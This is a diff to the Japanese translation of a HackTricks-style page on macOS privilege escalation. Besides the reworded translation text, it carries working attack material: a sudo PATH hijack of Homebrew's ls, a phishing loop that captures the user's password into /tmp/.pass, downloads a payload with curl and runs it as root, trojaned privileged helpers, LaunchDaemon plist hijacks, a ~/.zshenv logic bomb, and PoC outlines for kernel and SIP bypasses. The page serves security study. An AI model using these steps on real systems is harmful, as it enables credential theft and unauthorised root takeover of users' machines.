@@ -1,10 +1,10 @@
-# macOS Privilege Escalation
+# macOS 権限昇格
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TCC Privilege Escalation
 
-TCC privilege escalation を探してここに来た場合は、次を参照してください:
+TCC privilege escalation を探している場合は、以下を参照してください:
 
 
 {{#ref}}
@@ -13,7 +13,7 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-**Linux/Unix に影響する privilege escalation のほとんどの tricks は、MacOS** マシンにも影響することに注意してください。そのため、次を参照してください:
+**Linux/Unix に影響する権限昇格の手法のほとんどは、MacOS** マシンにも影響することに注意してください。以下を参照してください:
 
 
 {{#ref}}
@@ -24,9 +24,9 @@ macos-security-protections/macos-tcc/
 
 ### Sudo Hijacking
 
-元の [Sudo Hijacking technique は Linux Privilege Escalation post 内](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)にあります。
+Linux Privilege Escalation の記事内にある、元の [Sudo Hijacking technique](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) を参照できます。
 
-ただし、macOS はユーザーが **`sudo`** を実行する際に、ユーザーの **`PATH`** を **維持します**。つまり、この attack を実行する別の方法として、被害者が **sudo を実行するときに**引き続き実行する **他の binaries を hijack** する方法があります:
+ただし、macOS はユーザーが **`sudo`** を実行する際に、ユーザーの **`PATH`** を**維持**します。つまり、この攻撃を実行する別の方法として、被害者が **sudo の実行時に**実行する他のバイナリを**hijack**することもできます:
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<'EOF'
@@ -41,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.
+ターミナルを使用するユーザーは、**Homebrew installed** である可能性が非常に高いことに注意してください。そのため、**`/opt/homebrew/bin`** 内のバイナリを hijack できる可能性があります。
 
 ### Dock Impersonation
 
-Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:
+**social engineering** を利用すれば、Dock 内で **Google Chrome** などを **impersonate** し、実際には自分のスクリプトを実行させることができます。
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-いくつかの提案:
+いくつかの提案：
 
-- DockにChromeがあるか確認し、ある場合はそのエントリを**削除**して、**fake**な**Chromeエントリ**をDock配列内の**同じ位置**に**追加**します。
+- Dock に Chrome があるか確認し、ある場合はそのエントリを **remove** して、**fake** な **Chrome entry** を Dock array 内の同じ位置に **add** します。
 
 <details>
 <summary>Chrome Dock impersonation script</summary>
@@ -129,13 +129,13 @@ killall Dock
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-いくつかの提案：
+いくつかの提案:
 
-- **Dock から Finder を削除することはできない**ため、Dock に追加する場合は、偽の Finder を本物のすぐ隣に配置できます。これには、**Dock 配列の先頭に偽の Finder エントリを追加する必要があります**。
-- もう 1 つの方法は、Dock に配置せず、そのまま開くことです。「Finder が Finder の制御を求めています」という表示は、それほど不自然ではありません。
-- パスワードを尋ねる不審なダイアログを表示せずに**root へ privilege escalation**するもう 1 つの方法は、Finder に privileged action の実行のため実際にパスワードを尋ねさせることです：
-- Finder に、新しい **`sudo`** ファイルを **`/etc/pam.d`** へコピーさせる（パスワードを尋ねるプロンプトには「Finder が sudo をコピーしようとしています」と表示されます）
-- 新しい **Authorization Plugin** をコピーするよう Finder に指示する（ファイル名を制御できるため、パスワードを尋ねるプロンプトには「Finder が Finder.bundle をコピーしようとしています」と表示されます）
+- **Finder は Dock から削除できない**ため、Dock に追加する場合は、偽の Finder を本物の Finder のすぐ隣に配置できます。そのためには、**Dock array の先頭に偽の Finder エントリを追加する**必要があります。
+- 別の方法として、Dock に配置せずにそのまま開くこともできます。「Finder が Finder の操作を求めています」という表示は、それほど不自然ではありません。
+- 不自然なダイアログでパスワードを尋ねずに **root へ escalate** するもう 1 つの方法は、特権操作を実行するために Finder が実際にパスワードを尋ねるようにすることです。
+- Finder に新しい **`sudo`** ファイルを **`/etc/pam.d`** へコピーするよう要求する（パスワードを求めるプロンプトには「Finder が sudo をコピーしようとしています」と表示されます）
+- 新しい **Authorization Plugin** をコピーするよう Finder に要求する（ファイル名を制御できるため、パスワードを求めるプロンプトには「Finder が Finder.bundle をコピーしようとしています」と表示されます）
 
 <details>
 <summary>Finder Dock impersonation script</summary>
@@ -213,15 +213,15 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-### パスワードプロンプト phishing + sudo reuse
+### Password prompt phishing + sudo reuse
 
-Malware は、user interaction を悪用して **sudo-capable password を capture** し、programmatically reuse することがよくあります。一般的な flow:
+Malware は、ユーザーの操作を悪用して **sudo を実行可能なパスワードを取得**し、プログラムから再利用することがよくあります。一般的なフロー:
 
-1. `whoami` で logged in user を特定する。
-2. `dscl . -authonly "$user" "$pw"` が success を返すまで **password prompt を loop** する。
-3. credential を（例: `/tmp/.pass` に）cache し、`sudo -S`（password over stdin）で privileged actions を実行する。
+1. `whoami` でログイン中のユーザーを特定する。
+2. `dscl . -authonly "$user" "$pw"` が成功するまで、**パスワードプロンプトをループ**する。
+3. 認証情報をキャッシュし（例: `/tmp/.pass`）、`sudo -S`（標準入力経由でパスワードを渡す）で privileged actions を実行する。
 
-Example minimal chain:
+最小限の chain の例:
 ```bash
 user=$(whoami)
 while true; do
@@ -232,13 +232,13 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-盗まれたパスワードは、その後 **`xattr -c` で Gatekeeper quarantine を解除**したり、LaunchDaemons やその他の特権ファイルをコピーしたり、追加のステージを非対話的に実行したりするために再利用できます。
+盗まれたパスワードは、その後 **`xattr -c` で Gatekeeper quarantine を解除**したり、LaunchDaemons などの privileged files をコピーしたり、追加の stages を非対話的に実行したりするために再利用できます。
 
 ## 新しい macOS-specific vectors（2023–2025）
 
-### 非推奨の `AuthorizationExecuteWithPrivileges` は引き続き使用可能
+### 非推奨の `AuthorizationExecuteWithPrivileges` も依然として使用可能
 
-`AuthorizationExecuteWithPrivileges` は 10.7 で非推奨になりましたが、**Sonoma/Sequoia でも引き続き動作します**。多くの commercial updaters は、信頼できないパスを指定して `/usr/libexec/security_authtrampoline` を呼び出します。対象の binary が user-writable であれば、trojan を仕込み、正規の prompt に便乗できます:
+`AuthorizationExecuteWithPrivileges` は 10.7 で deprecated になりましたが、**Sonoma/Sequoia でも依然として動作します**。多くの commercial updaters は、untrusted path を指定して `/usr/libexec/security_authtrampoline` を呼び出します。target binary が user-writable であれば、trojan を仕込み、正規の prompt を利用できます:
 ```bash
 # find vulnerable helper calls
 log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
@@ -248,12 +248,12 @@ cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
 chmod +x /Users/me/Library/Application\ Support/Target/helper
 # when the app updates, the root prompt spawns your payload
 ```
-上記の **masquerading tricks** と組み合わせて、もっともらしい password dialog を表示します。
+上記の **masquerading tricks** と組み合わせて、信頼できそうなパスワードダイアログを表示します。
 
 
 ### Privileged helper / XPC triage
 
-現代の多くのサードパーティ製 macOS privesc は、同じパターンに従います。**root LaunchDaemon** が **`/Library/PrivilegedHelperTools`** から **Mach/XPC service** を公開し、その後 helper が **client を検証しない**、**検証が遅すぎる**（PID race）、または **user-controlled path/script** を受け取る **root method** を公開します。これは、VPN client、game launcher、updater で近年見つかっている多くの helper bug の背後にある bug class です。<sup>[4]</sup>
+現代のサードパーティ製 macOS privesc の多くは、同じパターンに従います。**root LaunchDaemon** が **`/Library/PrivilegedHelperTools`** から **Mach/XPC service** を公開し、その後 helper が client を **検証しない**、**検証が遅すぎる**（PID race）、または **user-controlled path/script** を受け取る **root method** を公開します。これは、VPN client、game launcher、updater における最近の helper bug の多くの背後にある bug class です。<sup>[[4]](#references)</sup>
 
 Quick triage checklist:
 ```bash
@@ -265,19 +265,19 @@ codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.ap
 strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
 done
 ```
-特に、以下の点に注意してください。
+特に、次のような helper に注意してください。
 
-- **uninstall 後も**、job が `launchd` にロードされたままになっているため、requests の受け付けを続けるもの
-- **`/Applications/...`** または non-root users が書き込み可能なその他の paths から scripts を実行したり、configuration を読み取ったりするもの
-- **PID-based** または **bundle-id-only** の peer validation に依存しており、race condition を悪用できる可能性があるもの
+- **アンインストール後も**、job が `launchd` に読み込まれたままになっているため、リクエストを受け付け続けるもの
+- **`/Applications/...`** または非 root ユーザーが書き込み可能なその他のパスから、script を実行したり configuration を読み取ったりするもの
+- **PID ベース**または **bundle-id のみ**の peer validation に依存しており、race condition を悪用できる可能性があるもの
 
-helper authorization bugs の詳細については、[this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) を確認してください。
+helper authorization bugs の詳細については、[このページ](macos-proces-abuse/macos-ipc/inter-process-communication/macos-xpc/macos-xpc-authorization.md)を確認してください。
 
 ### PackageKit script environment inheritance (CVE-2024-27822)
 
-Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、**`Installer.app`** / **`PackageKit.framework`** 経由で user-initiated installs を行うと、**PKG scripts を現在の user の environment 内で root として実行**できました。つまり、**`#!/bin/zsh`** を使用する package は、攻撃者の **`~/.zshenv`** を読み込み、victim が package をインストールした際に、それを **root として実行**できました。<sup>[3]</sup>
+Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、**`Installer.app`** / **`PackageKit.framework`** 経由でユーザーが開始した install は、**現在のユーザー環境内で PKG scripts を root として実行**できました。つまり、**`#!/bin/zsh`** を使用する package は、攻撃者の **`~/.zshenv`** を読み込み、被害者が package を install した際にそれを **root** として実行できました。<sup>[[3]](#references)</sup>
 
-これは **logic bomb** として特に興味深いものです。user account への foothold と、書き込み可能な shell startup file があればよく、その後は、脆弱な **zsh-based** installer が user によって実行されるのを待つだけです。これは通常、**MDM/Munki** deployments には適用されません。これらは root user の environment 内で実行されるためです。<sup>[3]</sup>
+これは **logic bomb** として特に興味深いものです。ユーザーの account への foothold と、書き込み可能な shell startup file があればよく、その後は、脆弱な **zsh-based** installer がユーザーによって実行されるのを待つだけです。これは通常、**MDM/Munki** deployments には適用されません。これらは root ユーザーの environment 内で実行されるためです。<sup>[[3]](#references)</sup>
 ```bash
 # inspect a vendor pkg for shell-based install scripts
 pkgutil --expand-full Target.pkg /tmp/target-pkg
@@ -287,11 +287,11 @@ rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
 # logic bomb example for vulnerable zsh-based installers
 echo 'id > /tmp/pkg-root' >> ~/.zshenv
 ```
-インストーラー固有の abuse についてさらに詳しく知りたい場合は、[こちらのページ](macos-files-folders-and-binaries/macos-installers-abuse.md)も確認してください。
+インストーラー固有の悪用についてさらに詳しく確認したい場合は、[このページ](macos-files-folders-and-binaries/macos-installers-abuse.md)も参照してください。
 
 ### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
 
-LaunchDaemon plist またはその `ProgramArguments` の target が **user-writable** である場合、それを差し替えた後に launchd に reload を強制することで privilege escalation できます：
+LaunchDaemon plistまたはその`ProgramArguments`の対象が**ユーザーによる書き込み可能**な状態の場合、それを差し替えてからlaunchdにreloadを強制することで権限昇格できます：
 ```bash
 sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
 cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
@@ -308,38 +308,38 @@ cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
 PLIST
 sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
 ```
-これは、書き込み可能な plist を悪用して attacker の code を root として実行した、**CVE-2025-24085** で公開された exploit pattern を反映しています。
+これは、**CVE-2025-24085** で公開された exploit pattern を反映したもので、書き込み可能な plist を悪用して attacker code を root として実行していました。
 
 ### XNU SMR credential race (CVE-2025-24118)
 
-`kauth_cred_proc_update` の **race** により、local attacker は複数の thread で `setgid()`/`getgid()` loop を実行し、torn `memcpy` が発生するまで race することで、read-only credential pointer（`proc_ro.p_ucred`）を破壊できます。破壊に成功すると、**uid 0** と kernel memory access が得られます。最小限の PoC structure は次のとおりです。
+`kauth_cred_proc_update` の **race** により、local attacker は複数の thread で `setgid()`/`getgid()` loop を実行し、torn `memcpy` が発生するまで race することで、read-only credential pointer（`proc_ro.p_ucred`）を破壊できます。破壊に成功すると、**uid 0** と kernel memory access が得られます。最小限の PoC structure:
 ```c
 // thread A
 while (1) setgid(rand());
 // thread B
 while (1) getgid();
 ```
-Controlled data を pointer が再読み込みされる場所に配置するため、heap grooming と組み合わせます。脆弱な build では、SIP bypass の要件なしで信頼性の高い **local kernel privesc** が可能です。<sup>[2]</sup>
+ヒープ grooming と組み合わせ、ポインタが再読み取りされる場所に制御可能なデータを配置します。脆弱なビルドでは、SIP bypass の要件なしで、信頼性の高い **local kernel privesc** が可能です。<sup>[[2]](#references)</sup>
 
-### Migration assistant 経由の SIP bypass（"Migraine"、CVE-2023-32369）
+### Migration assistant 経由の SIP bypass（"Migraine", CVE-2023-32369）
 
-すでに root を取得していても、SIP は system locations への書き込みをブロックします。**Migraine** bug は、Migration Assistant の entitlement `com.apple.rootless.install.heritable` を悪用して、SIP bypass を継承する child process を起動し、保護された path（例：`/System/Library/LaunchDaemons`）を上書きします。<sup>[1]</sup> chain は次のとおりです。
+すでに root を取得していても、SIP は system locations への書き込みをブロックします。**Migraine** bug は、Migration Assistant の entitlement `com.apple.rootless.install.heritable` を悪用して、SIP bypass を継承する child process を生成し、保護された path（例：`/System/Library/LaunchDaemons`）を上書きします。<sup>[[1]](#references)</sup> Chain は次のとおりです。
 
 1. 稼働中の system で root を取得する。
-2. 細工した state を使用して `systemmigrationd` を trigger し、attacker-controlled binary を実行させる。
-3. 継承した entitlement を使用して SIP-protected files に patch を適用し、reboot 後も persistence させる。
+2. 細工した state を使用して `systemmigrationd` を起動し、attacker-controlled binary を実行させる。
+3. 継承した entitlement を使用して SIP-protected files にパッチを適用し、reboot 後も persistence させる。
 
 ### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）
 
-複数の Apple daemon は XPC 経由で **NSPredicate** objects を受け取り、`expressionType` field のみを validation します。この field は attacker-controlled です。任意の selector を評価する predicate を作成することで、**root/system XPC services**（例：`coreduetd`、`contextstored`）で **code execution** を実現できます。initial app sandbox escape と組み合わせると、**user prompts なしの privilege escalation** が可能になります。predicate を deserialize する一方で、robust な visitor を備えていない XPC endpoint を探してください。
+複数の Apple daemons は XPC 経由で **NSPredicate** objects を受け付けますが、attacker-controlled な `expressionType` field のみを検証します。任意の selectors を評価する predicate を細工することで、**root/system XPC services**（例：`coreduetd`、`contextstored`）で **code execution** を達成できます。initial app sandbox escape と組み合わせると、**user prompts なしの privilege escalation** が可能になります。predicates を deserialize し、robust visitor を備えていない XPC endpoints を探してください。
 
 ## TCC - Root Privilege Escalation
 
-### CVE-2020-9771 - mount_apfs TCC bypass と privilege escalation
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
 
-**Any user**（unprivileged user も含む）は、`-o noowners` を指定して Time Machine snapshot を作成および mount でき、その snapshot 内の **ALL the files** にアクセスできます。これにより、live volume 上の ownership checks を bypass できます。必要な privilege は、使用する application（`Terminal` など）が **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）を持っていることだけです。
+**Any user**（unprivileged users を含む）は、`-o noowners` を指定して Time Machine snapshot を作成・mount し、その snapshot 内の**すべてのファイルにアクセス**できます。これは live volume 上の ownership checks を bypass します。必要な privilege は、使用する application（`Terminal` など）が **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）を持つことだけです。
 
-commands と完全な説明は TCC bypasses page にあります。
+Commands と完全な explanation は、TCC bypasses page にあります。
 
 {{#ref}}
 macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
@@ -347,7 +347,7 @@ macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
 
 ## Sensitive Information
 
-これは privilege escalation に役立つ場合があります。
+これは privilege escalation に役立つ可能性があります。
 
 
 {{#ref}}
@@ -356,8 +356,8 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 ## References
 
-- [1] [Microsoft "Migraine" SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [2] [CVE-2025-24118 SMR credential race write-up と PoC](https://github.com/jprx/CVE-2025-24118)
+- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
 - [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
 - [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 
